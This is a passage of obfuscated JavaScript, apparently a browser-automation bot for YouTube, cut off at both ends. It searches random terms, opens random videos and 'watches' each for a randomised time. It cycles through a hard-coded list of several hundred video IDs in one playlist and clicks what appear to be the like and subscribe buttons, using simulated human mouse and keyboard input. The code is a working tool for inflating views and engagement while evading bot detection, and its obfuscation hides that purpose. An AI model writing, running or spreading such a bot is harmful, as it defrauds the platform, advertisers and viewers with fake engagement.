          log('watching..' + '.'), await Z['evaluate'](() => {
            var a1;
            (a1 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x103 + 0x1166 + -0x1269, -0x1 * -0xad1 + 0x17a2 + -0x226c * 0x1), a1[Math['floor'](Math['random']() * a1['length'])])['setAttribu' + 'te']('id', '__scope');
          }), await v('#__scope', -0x1806 * 0x1 + 0x1fae + -0x7a8, Z), await y(Z);
          const a0 = await A(Z);
          return await wait(min((0x10 * 0x173b + -0x11002 + 0x6 * 0x1673) * getRandomInt(-0x11f0 + 0x192e + 0x1cf * -0x4, 0x681 + -0x20c + 0x8e * -0x8), a0)), -0x5 * 0x40d + 0x1 * 0x2027 + -0xbe5;
        }
        async function A(Z) {
          return await Z['evaluate'](() => {
            const aN = d,
              aM = c,
              a0 = {
                'Seconds': 0x3e8,
                'Minutes': 0xea60,
                'Hours': 0x36ee80,
                'Second': 0x3e8,
                'Minute': 0xea60,
                'Hour': 0x36ee80
              };
            let a1 = Array['from'](document[aM(0x1) + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
              a2 = -0x70 + -0x4ba + -0x295 * -0x2;
            a1 = a1[aN(0x23)](a1['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1c5e * 0x1 + 0x1372 + 0x1 * 0x8ed]['split']('\x20');
            for (let a3 = -0x1d47 + 0x4e4 + 0x1863; a3 < a1['length']; a3 += 0x1 * -0x5d1 + -0x43 * 0x85 + -0x2e7 * -0xe)
              a2 += a1[a3] * a0[a1[a3 + (-0x2488 + 0x229f + 0x1ea)]];
            return a2;
          });
        }
        async function B(Z) {
          const aO = d;
          log('goto\x20chann' + aO(0x1f) + 'w\x20video\x20pr' + 'ocess...'), await Z['goto'](channels['random'](), {
            'timeout': 0x0
          }), await v('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)', -0x2d8 * 0x8 + 0x1e3 + -0x2fb * -0x7, Z), log('clicked\x20vi' + 'deo\x20stuff'), await y(Z), log('page\x20netwo' + 'rk\x20idle\x20x2'), await Z['evaluate'](() => {
            const aP = d,
              a2 = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](a4 => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == a4['getAttribu' + 'te']('class'))['slice'](0x832 * 0x1 + -0x3 * 0x990 + 0x1484)['map'](a4 => Array['from'](a4['children']))['flat'](-0x9 * -0x295 + 0x1 * -0x13ff + -0x33d)['map'](a4 => a4['childNodes'][-0x3d * -0x85 + -0x1e5f + 0x1 * -0x151]['childNodes'][0x8cc + 0x1 * 0x138b + -0x1c57]['childNodes'][0x414 * 0x4 + -0x1923 + 0x8d4]['childNodes'][0x879 * -0x2 + 0x3f * 0x4f + -0x9 * 0x47]['childNodes'][-0xfb + 0x20e + -0x112]);
            var a3;
            return (a3 = a2)[Math['floor'](Math['random']() * a3['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), a2['map'](a4 => a4[aP(0x21)]);
          }), await wait(getRandomInt(0xcd8 + -0x1f21 + 0x1631, -0x222f * -0x1 + -0x2 * 0xe5c + -0xd * -0x115)), await v('#__hookedV' + 'idToWatch', -0x6f * -0x23 + -0x2217 + 0x12eb, Z), log('woah\x20click' + 'ed\x20some\x20vi' + 'deoo'), await wait(0x4bec * 0x1 + -0x4163 + 0x300f);
          const a0 = await A(Z),
            a1 = min((-0x3e8f * 0x2 + -0x3027 * 0x2 + -0xe3e6 * -0x2) * getRandomInt(0x1 * -0x71 + -0xb9e + 0xc11, -0x1eee * 0x1 + 0x3 * 0xbc5 + -0x45c), a0);
          return log('Watching\x20v' + 'id\x20for\x20' + a1 + ('ms,\x20max\x20ti' + 'me:\x20') + a0 + 'ms'), await wait(a1), 0x285 + 0x3b * -0x5 + -0x15d;
        }
        async function C(Z) {
          return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await Z['waitForSel' + 'ector']('.style-sco' + 'pe\x20ytd-ric' + 'h-grid-row'), await Z['evaluate'](() => {
            var a0;
            (a0 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](a1 => 'contents' != a1['id']), a0[Math['floor'](Math['random']() * a0['length'])])['children'][-0x1907 + 0x46 * -0x4f + 0x17 * 0x207]['children'][-0x1 * -0xa8b + 0x1 * -0x204f + 0x15c4]['children'][-0x7bf * 0x3 + -0x13 * -0x19 + -0xee * -0x17]['children'][-0x56d * 0x6 + 0xc57 + 0x1437]['children'][0x16f * 0x11 + 0x1733 + -0x2f92]['setAttribu' + 'te']('id', 'gottemezez');
          }), await v('#gottemeze' + 'z', -0x851 + -0xb23 + 0x125 * 0x11, Z), await y(Z), await z(Z), 0x4 * -0x151 + 0xce2 + -0x1 * 0x79d;
        }
        async function D(Z) {
          log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await Z['evaluate'](() => {
            let a2 = Array['from'](document['querySelec' + 'torAll']('#search'));
            document['getElement' + 'ById']('__searchBo' + 'xReal') || a2['find'](a3 => 'INPUT' === a3['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
          }), await v('#__searchB' + 'oxReal', 0x1 * -0x11cb + -0x162d + 0x8 * 0x4ff, Z), await q['simKeyboar' + 'dType'](searchTerms['random']() + ''), await v('#search-ic' + 'on-legacy', -0x1 * 0x3e1 + -0x2283 + 0xfc * 0x27, Z), log('searching.' + '..'), await Z['waitForFun' + 'ction']('Array.from' + '(document.' + 'getElement' + 'sByTagName' + '(\x22ytd-vide' + 'o-renderer' + '\x22)).length'), await y(Z);
          let a0 = await Z['evaluate'](() => {
            const a2 = {
                'seconds': 0x3e8,
                'minutes': 0xea60,
                'hours': 0x36ee80,
                'second': 0x3e8,
                'minute': 0xea60,
                'hour': 0x36ee80
              },
              a3 = (a4 = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](a6 => a6['childNodes'][-0x6a1 + 0x2 * -0x2b3 + -0x3 * -0x403]['childNodes'][0xa5d + -0xc02 + 0x1a6]['childNodes'][-0x16f9 + -0xbb1 * 0x1 + 0x22ab]))[Math['floor'](Math['random']() * a4['length'])];
            var a4;
            const a5 = a3['childNodes'][0x4 * 0x722 + 0x1 * -0x2b6 + 0x19cd * -0x1]['childNodes'][0xab0 + -0x26b2 + 0x1c02]['childNodes'][0x2216 + -0x236d + -0x159 * -0x1]['ariaLabel'];
            return a3['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'),
              function(a6) {
                let a7 = a6['split'](',\x20')['map'](a9 => a9['split']('\x20'))['flat'](-0x99a + 0x5 * 0x533 + -0x4 * 0x419),
                  a8 = -0x2 * -0xf7a + -0x2 * -0x124d + -0x438e;
                for (let a9 = -0xdfe * -0x1 + -0xc4f + -0x1af; a9 < a7['length']; a9 += 0x2d0 + 0x481 * 0x4 + -0x14d2)
                  a8 += a7[a9] * a2[a7[a9 + (0x1 * 0x16e4 + -0x1 * -0x1b06 + 0x1 * -0x31e9)]];
                return a8;
              }(a5);
          });
          await v('#__hookedV' + 'idToClick', 0x1820 + -0x2e1 * 0xa + -0x255 * -0x2, Z);
          let a1 = min((-0x15059 + -0x3fd * 0x5 + 0x24eaa) * getRandomInt(0x1 * 0xf75 + 0xa7 * -0x1 + -0xecd * 0x1, -0x468 + -0x173d + 0x1baf), a0 + (-0x40 * 0x7 + -0x132e + 0x143b * 0x2));
          return log('watching\x20v' + 'ideo\x20for\x20' + a1 + 'ms'), await wait(a1), 0x16de + -0x21ad + 0xad0;
        }
        const E = [
          'eHpl-BjXo5' + '8',
          '-PgyODlV6V' + '8',
          'S9EkXX0QYD' + 'U',
          'WvcG1OKdHW' + 'o',
          'b6gOcEwtZ8' + 'U',
          'apdtzA0Dzf' + 'k',
          'YiukDwYv2K' + '4',
          'zK-6UH5R5X' + '8',
          'bIXqNjtsEf' + '4',
          '3l253rESkw' + 'Q',
          'u6RVZKcN9z' + 'Q',
          '6ImZdwpdwT' + 'A',
          '0qPB5ANSBK' + 'c',
          '92duH3cqn1' + 'M',
          'b5lKI78fw3' + 's',
          'zpCCPZfP8L' + 'I',
          'ES7oooakr-' + 'c',
          '2eWyJ8FBvQ' + '8',
          'O4-B3OFPDf' + 'Q',
          'JFcnGk0_u7' + 'o',
          'AP7d2Ghq6d' + 'U',
          'UizEAwrZAG' + 'I',
          '0FAi5-h8Hj' + '0',
          'CNqA6IYj17' + 'k',
          'tSiKyCpwnS' + 'Y',
          'OrglyeV5xP' + 'Y',
          'BXkB-g4eCc' + 's',
          'Y53CmmpbOJ' + 's',
          'sm5MLz_IrQ' + 'k',
          'EuciRU_Ska' + '0',
          'cCbDCTLyPc' + 'E',
          'Ox7Ng5T7bm' + 'c',
          'TXTaB-dQg-' + '0',
          '3jSWaWgr_A' + '0',
          'xT8nvuxCRB' + 'E',
          '3c4Ab9EmRg' + 'Y',
          '2kScgeNOpL' + '8',
          't22jhowMom' + 'c',
          'HbcDLgkmXL' + 's',
          'JsKZ41uTeg' + 'c',
          'dfU48FRgs0' + 'g',
          '3K9ILewnUk' + 'o',
          'QmKwnRiKhD' + 'k',
          'n3nVsWsL6I' + 'k',
          'noTs52D_Mw' + 'Y',
          'A0tDR4nTTK' + '0',
          '9eBwFca-B1' + '4',
          'moasU30H5l' + 'A',
          '_Mb8oQtSBW' + 'E',
          'TNGGOgwPtc' + 'M',
          '-pYA-gjkQ8' + 's',
          '5d-dB6tZZA' + 'o',
          '8H2AiOV0oE' + 'o',
          'mI7aiKDGde' + 'w',
          'D-IMDYrj35' + '4',
          'gKgFiEgghy' + 'g',
          'mjVwfjJ2nj' + 'k',
          '6auDBi-D2H' + 'M',
          'X89-SWNdIE' + 'k',
          'T5Pn4LhIwj' + 'M',
          'wVnKGSjY3i' + '8',
          'g11NJftxw1' + '4',
          '9zHirkfEKk' + 'k',
          'ZyGS_AMbIa' + '4',
          'yG6bwB17ZP' + 's',
          'aytHiLe0s6' + 'U',
          'cGe-Mpw_F1' + 'w',
          'eMK7xV_nxZ' + 'o',
          'epJ2MAKa1Y' + 'Q',
          '5BNbKKMUhE' + 'o',
          'oxpAvc6tDP' + '8',
          'jRcc-NIR2R' + 'I',
          '258btO4mFw' + '4',
          'pXjJAUvSbQ' + 'A',
          '63-irfPjh2' + 'c',
          'xbrDZAFf3Q' + 's',
          'MVHMtRlesU' + 'g',
          'zed05qfHMB' + 'I',
          'nkhkxKUHsY' + 'g',
          'n4cSAqR9H1' + 'Q',
          'gOUPndcj7z' + 'I',
          'n3HBTTDHoX' + '8',
          'XIgMFHPIXv' + '4',
          'oQHKMky-_K' + 'c',
          'zfDgTzZ2nh' + '0',
          '1PYettRo-D' + 'M',
          'jzuZuwF490' + '4',
          '2DAgWTlXae' + '8',
          'keouUYA5hI' + 'k',
          'F7i7wRlGCd' + 'c',
          'uToD2c0CdJ' + 'c',
          aQ(0x11, '9g$6') + '8',
          '-rrH657DAa' + 'o',
          'QTrEEWtDks' + '4',
          'TWTSnQDuad' + 'Y',
          'a0GUyvgnzg' + 'c',
          'eSReWZQyKd' + 'E',
          'D_5pMqdKSs' + '4',
          'm0ie8gHS00' + 'I',
          '6WosqMq9ej' + 'o',
          'i0afAOlon_' + '4',
          'j_fe6PfxW4' + 'Y',
          'GfPzi8SYr0' + 'w',
          'MSgZhNCwff' + 'M',
          'wxyBC_z6bI' + '8',
          'PkQpV-Fwhs' + 'k',
          'bVD6cWOVhN' + 'U',
          'mjZOpQlHbx' + 'M',
          'k_BXkcdbBO' + 'M',
          'X72oUsFV7q' + '0',
          'lONsILfq-W' + 'Y',
          'Bhe9PyM_s_' + 'Q',
          'Bhe9PyM_s_' + 'Q',
          'h4TBnDkX4y' + 'o',
          'PNBJyHEkfk' + '4',
          'L3iHS__ufc' + 'g',
          'm7aliUAwm_' + 'Y',
          'FuPVf85zMi' + 'w',
          'gtupAeNTDS' + 'M',
          'yyJ8zkckoB' + '8',
          'ZDTESiN1eS' + 'w',
          'Fo6x16DkoR' + 'o',
          'IAJqRxhVqO' + 'k',
          'KAgwII8TGj' + 'o',
          'o4tLCshmlb' + 'M',
          'dLj5fIupdA' + 'o',
          '_Xl_-b9P4U' + 'Q',
          'V3NxxpUUfW' + 'E',
          'J3ygeDEMnO' + 'w',
          'HcP_xmdwsl' + 'c',
          'M9g0h7px2_' + 'M',
          'b5WfUvcSgr' + 'U',
          'JGHnIshsoC' + 'E',
          'x2gfhCLHd9' + '4',
          'M5Fr8G0ma9' + 'o',
          '3sGeIBfFlC' + 'M',
          'k74y4KOJ2m' + '4',
          'pTHJB0S8E-' + 'U',
          'KaIrXJLfYP' + 'M',
          '0cisZkywhg' + 'Q',
          '0dVzItbl9E' + 'w',
          't0EqnhcSb1' + 's',
          'MuiXtvo1RY' + 'E',
          'Nj-3KC6knH' + 'w',
          'B19HbETNi5' + '8',
          'yKN_QkroH6' + 's',
          'U9ExFM1pji' + '0',
          'sONzDfjKhL' + '4',
          'n3Kj8zEfew' + 'U',
          'nXLGQ7QeoG' + 'Y',
          'OQFQiwiM-P' + 'Y',
          'UtPRpKRTtH' + 'U',
          'E56Myp0BzE' + 'E',
          '7DjOp_JM2Z' + 'w',
          'rNFLQFz_G1' + 'g',
          '1r2pKoVAdj' + 'M',
          'gm3eiv6UND' + 'M',
          'yOiROfjxzX' + 'o',
          'lt2AcxC_ap' + 'g',
          'bObEme2BDO' + 'E',
          '6Ut6HbJmW4' + 'w',
          'fUs0TtQQTo' + '0',
          '_phHS3FAgW' + 'Q',
          '1f8sU4l3dP' + '4',
          'HwTSLUd53K' + '8',
          'EpP2ymD_QG' + 'A',
          'TQ69QFqmbo' + 'I',
          'wA8BqUka_u' + '0',
          'bc8Ey-vuR5' + 'M',
          'PZ_uLi7ULl' + '0',
          'smu5FsnhwF' + '4',
          'dv1JluwoOb' + 'c',
          'nHotP0jbcv' + 'A',
          'iIjYNEmrVv' + 'M',
          'SeP-OZAiPb' + 'c',
          'v52PClvMFt' + 'k',
          '3loLqIPxTS' + '0',
          'jVu9mOzbSq' + 'U',
          '73SAN1vOrV' + 'k',
          'YLPxp4ntym' + 's',
          'YWXfelRk3b' + 'Q',
          'CsxlLMb6Uj' + 'o',
          'uafGOfwzpa' + 'Q',
          'XIr8qotHOI' + 'E',
          'EcoPCWC3Uh' + 'o',
          'AhOwyT8aIh' + 'g',
          't-Ox7lI5UH' + 's',
          'i08qNmssXe' + 'Q',
          'QrJIU09eD-' + 'g',
          'QvNNCQ-8Rp' + 'E',
          'k5gjnjDFAZ' + 's',
          'h_NQ3y1ek8' + 'U',
          'evPsJlNLy_' + '4',
          'qEPTydgwh4' + 's',
          'LB685ckhuf' + 'E',
          'Lj1EcSMGey' + '0',
          'OE19r7MIMW' + 'Q',
          'u8E3p0Vy-P' + 'Y',
          'f4a5OPFQa7' + 'k',
          'XDo7Q7yUEt' + 'k',
          'Vw_9zw0qHI' + 'c',
          'KGT5nbDsI_' + '8',
          'E008Eql59M' + 'Q',
          'wSOFdefX47' + 'A',
          '2xcv7q3QhR' + 'E',
          'hgfvmcBkc0' + '4',
          '0wP7csnX7k' + '4',
          'Xo0R8WiRSb' + '4',
          '8zNp8EOpGd' + '4',
          'sWYhIJZmoS' + 'E',
          'YdG8U1W-bX' + '0',
          'QeDsoSNml-' + 'c',
          'xW5q77El0x' + '8',
          'ZF14issJFE' + 'Y',
          'TRglEGLLKX' + 'o',
          'UE0SXc5k1e' + 'g',
          '6VY65D8f3D' + 'Q',
          'Iwxuob4fA8' + 'Q',
          'M4elJHCUIi' + 's',
          'GY9WWhO504' + 'k',
          'eErUSxmLDw' + '8',
          'ITQfAfzLj3' + 'I',
          'vbDrCL2FuL' + 'g',
          'KyQ_sUgtbK' + 'U',
          aQ(0xd, 'yxS5') + 'I',
          '2SqCn2LreN' + 'g',
          '1i-G2TUn41' + '0',
          's0ru6uK7vi' + '8',
          'gOxiE5UAAD' + 'w',
          'lx1rOOjekc' + '8',
          '5VYN2zA-Si' + 'k',
          'q9rLWEAzoo' + 'k',
          '4KSm3IY7Xz' + 'g',
          'fMqRu_ON-D' + 'E',
          'GfvShU6Sy9' + 'A',
          'OHzOmi1b60' + 'Y',
          'D9oTUKT-_n' + 'A',
          '_BrT2PlUiw' + '0',
          'kuuI4LzKgm' + 'I',
          '78dymyg88r' + 'M',
          'mi0nGt2B-q' + 'o',
          'HaI7BjnwnO' + 'c',
          'xlAEOkIuy7' + 'Y',
          '3VmtckvTXl' + 'U',
          'ed7TWHKDr4' + 'E',
          '2LfTjyVtbf' + 'U',
          'STHlCkloyv' + 'E',
          '-BI_-6YnM6' + 'Y',
          'LSK_G1qCQw' + 'M',
          '4tzqIl6EKV' + 'k',
          '9DshU55EiV' + '8',
          'mBtaEI_6e8' + 's',
          '960lvuduwY' + 'w',
          'XWJH-6J5Ee' + 'g',
          'XLS4qmyCAX' + 'g',
          '8cJDYeRiLn' + 'k',
          'cCaIVrltHz' + 'w',
          '8X2fF4pgM0' + 'E',
          '6s8Xm4wylr' + '4',
          'eFceshvavn' + 'o',
          '2h4g7euqR-' + 'U',
          'ujiBqXnn92' + '8',
          'w9F2NST-9j' + 's',
          'w-oc7F5Mmy' + 'U',
          'UYrmqL3cOD' + 'U',
          '4QB59etj0I' + 'o',
          'MY9MTNgXcN' + 'o',
          'ISBmcKDS5C' + '8',
          'ogIb7A7tvW' + '0',
          '-L583IZF6s' + 'k',
          'NbeKQq29ZL' + '0',
          'SPplDxd74F' + 's',
          'MHGV8QmpAz' + 'k',
          'iWzezFWpU7' + 'A',
          'NNCQt1rXXE' + 'Y',
          'bcb_ZhJJK8' + 'g',
          '3KoZGQiY6N' + 'o',
          'aSaXQH8F1_' + 'A',
          'V5nMOhI62o' + 'w',
          'JvlPjRUdId' + '0',
          '2gQHuClLCb' + '0',
          '5e-qDy-uUJ' + 'E',
          'oE8vC0QEWU' + 'E',
          '7cQken99yu' + 'o',
          'pmzu080j7r' + 'I',
          'sVy9F4whP6' + 'o',
          'MJrkylk7iE' + 'c',
          'XYjsTxi6oE' + '8',
          'mKlMouB6tp' + '0',
          'o2yunZQley' + 'A',
          'oRryU9F9Lv' + 's',
          'uzzK-052H0' + 'c',
          'VSvA4rCe-4' + 'M',
          'XURH2u_0fM' + 'I',
          'yfpVL2g_tk' + 'o',
          'AuEEjQ8x9o' + 'w',
          'wWkviY8zBr' + 'c',
          'zt_eubHWhx' + 'c',
          'O_7_BGU3u_' + '0',
          'QFDKBxmOn3' + 'Y',
          'w6gccNWXXv' + 'g',
          'VdNJxbrqdX' + 's',
          'wbi5Dxebvn' + 'I',
          'XEFOREYrJg' + 'k',
          'I2rcRta7WJ' + '0',
          'OP5KGfXHX_' + 'A',
          'w2MUMbbwlm' + 'o',
          'X3bF0nd6kf' + 'w',
          'WDDAhASf9j' + 'w',
          'fRwcV8gjbc' + 'w',
          '7T63gaRThr' + '0',
          'zC8AWIwhbf' + 's',
          'JSkVE0n-ee' + 'o',
          'qiQA5pWWRt' + 'U',
          'QdXCjZtfXu' + 'c',
          'vlBji8TOax' + 'o',
          'pBx_5CbIcp' + 'o',
          'L1Oy5F6ZMO' + 'Q',
          'P0NjLaBed-' + 'E',
          'DR16C4-keB' + '0',
          'LGmpIpu9eD' + 'w',
          'rNkX_A4kBA' + 'Q',
          'QztVMjrEk4' + '0',
          'uOM6m6KL5d' + '4',
          'g-Aju8xrrO' + 'E',
          'DfkDbFk_x9' + '8',
          'Y4NLDaowD6' + 'I',
          'ALSZnqQTuJ' + 'o',
          'xUmB6BpZBE' + 'w',
          'SxNOcZ1s85' + '8',
          '-noeCjO416' + 'k',
          'taPJqXBI8V' + 'Y',
          'YxqbkMi1Is' + '4',
          'vnJTyve2r-' + '4',
          '44lRVYQ38E' + 'Q',
          'QOv1N1X5J-' + 'g',
          'jNjREs7ODT' + 'g',
          'U30ToJo3dd' + 'k',
          'rm7lNIIOQC' + 'Y',
          'mGU6sOPlYv' + 'c',
          '6pwxUXdt6T' + 'Q',
          '6MkJRee35a' + 'Q',
          'LVbf7U9WAI' + 'c',
          'gPbhFvEeJ3' + 'M',
          'LWXAxz0MiH' + 'A',
          'L0KQJqfwJJ' + 'Y',
          'GWr33_u0VK' + 'c',
          '4ud3ZPfWkH' + 's',
          'dxSrySC4XM' + 'c',
          'iIM2KZC69W' + '0',
          '8DuJ3BAwME' + 'o',
          'm3BAhe1wsl' + 'Y',
          '02U_3pAZxM' + '8',
          '0e7nidPa97' + 'g',
          'TixW__6Eer' + 'o',
          'q46W8MTRTC' + 'E',
          'Jdxp04Je1O' + 'w',
          'HfP4TO3gfN' + '0',
          '4dUJaeB0qL' + '8',
          'xnL-fRJ3RZ' + 'o',
          'yJbD0Df45u' + 'Q',
          '-pGw8RkSSB' + 'k',
          '7cy86Njsis' + 'M',
          'jbgqvxtauo' + '4',
          'N8M00JjSVI' + 'I',
          'MfR5q6Td3R' + 'c',
          'eHwcx94wcp' + 's',
          'olDgVFgAgP' + 'o',
          'eAAd5BmzXz' + 'M',
          'xgTjQ2sGXd' + '4',
          'ipny6JUbzw' + 's',
          'WOwQ0UxbRj' + '4',
          'h0PKFed2GB' + 's',
          'JxdOrgzq7Z' + '8',
          '-VgpSWWW-8' + 'w',
          '-ix4OizkAn' + 's',
          'd3CRE9y3YV' + 's',
          '4QZlfXxorJ' + 'o',
          'YlDpg8aCs5' + 'M',
          'Qe5WT22-AO' + '8',
          'b_rjBWmc1i' + 'Q',
          '9yjZpBq1XB' + 'E',
          'hPx-RiBKXt' + 'Q',
          'UMqLDhl8PX' + 'w',
          'DlJEt2KU33' + 'I',
          'BWeqoARup-' + 'Q',
          '2Dx76lD8Sc' + 'c',
          'j_nI6G3ZDi' + 'E',
          'zvcUYYN1sx' + 'w',
          'cWRkYo1S3L' + '4',
          'cWRkYo1S3L' + '4',
          'bxC_PN3SRv' + 'I',
          '94m93T_5JL' + 'M',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'bo9fTeXvSi' + 'A',
          'z6LqXiAK-8' + '0',
          '5tbOspjJ5f' + '0',
          'twQ6kKjtBk' + 'Y',
          'Ig17K38Fy0' + 'Y',
          'ZdlrVDwn_a' + '4',
          'aCT4Lddunx' + 'g',
          'acAvMGQtln' + 'M',
          '8XkcbdSRdO' + '0',
          '0e3GPea1Ty' + 'g',
          'zxYjTTXc-J' + '8',
          '9bqk6ZUsKy' + 'A',
          'plSyrHqUh7' + '8',
          'HkvQywg_uZ' + 'A',
          'lADBHDg-Jt' + 'A',
          'I2O7blSSzp' + 'I',
          'kd2KEHvK-q' + '8',
          'CbUjuwhQPK' + 's',
          'fb7T1v_VHp' + 'E',
          'SpeSpA3e56' + 'A',
          'RQdxHi4_Pv' + 'c',
          'nx2-4l4s4N' + 'w',
          'tUTCq3iiw_' + '4',
          'VDa5iGiPgG' + 's',
          'S-sJp1FfG7' + 'Q',
          'Hm1YFszJWb' + 'Q'
        ];
        async function F(Z) {
          await Z['goto']('https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + E['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y')), await v('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill', 0x20e9 + 0x1 * 0xa6e + -0x2b56, Z), await v('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill', -0x521 + 0x29c + 0x286, Z);
          const a0 = setInterval(async () => {
            log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await Z['evaluate'](() => {
              setTimeout(() => {
                const aR = b;
                document[aR(0x4, 'Wtjs') + 'tor']('.ytp-large' + '-play-butt' + 'on') ? .['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
              }, -0x2394 + -0x137d + 0x42c9 + (-0x15cc + -0x1 * 0x134f + 0x2d03) * Math['random']());
            });
          }, -0xcd6 * -0x2 + 0x2d2 + 0xe * -0x15);
          await wait(-0x2 * 0x2697c + -0x761e4 + -0x4322f * -0x4);
          try {
            Z['$']('#__lllll') && await v('#__lllll', -0x233 * 0xd + -0x49 + 0x1ce1, Z);
          } catch (a1) {}
          return await wait((0x91a0 + 0x74b2 + -0x1bf2) * getRandomInt(-0x222b + -0x1cf2 + 0x1 * 0x3f21, 0x3 * 0x92f + -0x13a + -0x6 * 0x45f)), clearInterval(a0), -0x11 * 0x66 + 0x2 * -0x256 + -0xb73 * -0x1;
        }
        const G = [
          D,
          B,
          C,
          F
        ];
        async function H() {
          return await wait(-0x9d * -0xf + -0x9 + -0x862 + (-0x2 * -0xd8a + 0x95c * 0x2 + -0x2d04) * random()), 0x1279 + -0xd * -0x126 + -0x2166;
        }
        async function I(Z, a0, ...a1) {
          Check['ia'](Z, Page, Frame), Check['nes'](a0), Check['all'](a1, 'string');
          let a2 = [];
          ! function a5(a6) {
            a2['push'](a6);
            for (const a7 of a6['childFrame' + 's']())
              a5(a7);
          }(Z['mainFrame']());
          const a3 = 'qkdjuqwyhd' + 'uqjidwqdjq' + 'hn' + GSI++,
            [a4] = await Promise['race'](a2['map'](a6 => setWait(a6, a0, a1, a3)));
          return await a4['$']('.' + a3);
        }
        async function J(Z, a0, a1, a2 = 0x2086 + -0x2 * 0x1093 + 0xa1) {
          const aS = c;
          if (!Z['fakeUserAc' + 'tion'])
            return warn('Requires\x20F' + 'UA\x20hoist!');
          Check['inst'](a0, ElementHandle), Check['nes'](a1), '_click' === a1 ? await Z['fakeUserAc' + 'tion']['simClickEl' + 'ement'](a0) : '_view' === a1 ? await Z['fakeUserAc' + 'tion']['simMouseMo' + 'veToElemen' + 't'](a0) : await K(Z, [
            aS(0x12),
            a1
          ]), a2 && a0 && await a0['dispose']();
        }
        async function K(Z, ...a0) {
          const aU = b,
            aT = d;
          if (!Z['fakeUserAc' + 'tion'])
            throw new Error('Controller' + '\x20still\x20not' + '\x20hoisted!');
          Check['cust'](a0, a1 => a1['every'](a2 => 'string' == typeof a2 || Array['isArray'](a2)));
          for (let a1 of a0)
            if ('object' == typeof a1) {
              const a2 = a1['slice'](0x76 * 0x4a + -0x8e * 0xf + -0x19c9),
                a3 = a1[0x1ead + -0x755 + -0x1758];
              switch (flags['debug'] && log('[DEBUG]\x20Ex' + 'ecuting\x20ac' + 'tionType:', a3, 'with\x20argum' + 'ents:', a2), a3) {
                case 'waitfunc':
                  {
                    const [a4, a5] = a2;
                    'string' != typeof a4 && warn('[WATCHDOG]' + '\x20FunctionS' + 'tring\x20fail' + 'ure\x20here:', a2),
                    a5 instanceof Page || a5 instanceof Frame || warn('[WATCHDOG]' + '\x20Scope\x20fai' + 'lure\x20here:', a2),
                    await a5['waitForFun' + 'ction'](a4);
                  }
                  break;
                case 'waitsel':
                  {
                    const [a6, a7] = a2;
                    'string' != typeof a6 && warn('[WATCHDOG]' + '\x20FunctionS' + 'tring\x20fail' + 'ure\x20here:', a2),
                    a7 instanceof Page || a7 instanceof Frame || warn('[WATCHDOG]' + '\x20Scope\x20fai' + 'lure\x20here:', a2),
                    await a7['waitForSel' + 'ector'](a6);
                  }
                  break;
                case 'type':
                  if ('string' != typeof a2[-0x14ae + -0x4c * -0xd + 0x10d2] && (warn('[WATCHDOG]' + '\x20Text\x20fail' + 'ure\x20here:', a2), 'number' == typeof a2[0x625 * 0x1 + 0xda8 + -0x13cd])) {
                    const a8 = a2[0x1693 + -0x22b2 + -0x1d * -0x6b] + '';
                    warn(aT(0x20) + '\x20Recoverab' + 'le\x20error,\x20' + 'state:', a2[0x224d + -0x1f90 + -0x1 * 0x2bd], a8), a2[0x15 * 0x3 + 0x87b * 0x1 + -0x1 * 0x8ba] = a8;
                  }
                  a2[0x1345 + -0x8f + -0x12b5] && 'object' != typeof a2[0x252b + -0x4d * -0x4d + -0x1 * 0x3c53] && warn('[WATCHDOG]' + '\x20option\x20ob' + 'ject\x20failu' + 're\x20here:', a2), await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dType'](a2[-0x8d * 0x17 + 0xd * 0x1d2 + 0x5 * -0x233]);
                  break;
                case 'stype':
                  {
                    const a9 = a2['shift']();
                    Check['nes'](a9);
                    const aa = a2['shift']();
                    Check['ia'](aa, Page, Frame);
                    const ab = a2['shift']();
                    Check['nes'](ab),
                    isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20pruning\x20t' + 'echniques\x20' + 'failed\x20in\x20' + 'stype:', ab, aa, a9, a2),
                    log('[debug]\x20in' + aU(0x2a, '4#UB'), aa, ab, ...a2);
                    const ac = await I(aa, ab, ...a2);
                    log('[debug]\x20fo' + 'und\x20elemen' + 't', ac),
